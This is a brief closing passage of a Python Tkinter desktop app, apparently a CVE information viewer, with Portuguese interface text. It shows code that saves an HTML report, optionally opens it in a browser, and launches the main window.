            messagebox.showinfo("✅ Sucesso", f"Relatório salvo em:\n{arquivo}")
            self.status_var.set(f"✅ HTML salvo: {arquivo}")
            if messagebox.askyesno("Abrir", "Abrir relatório no navegador?"):
                webbrowser.open(f"file:///{arquivo}")
        except Exception as e:
            messagebox.showerror("Erro", f"Falha ao salvar:\n{e}")


if __name__ == "__main__":
    root = tk.Tk()
    app = CVEInfoApp(root)
    root.mainloop()
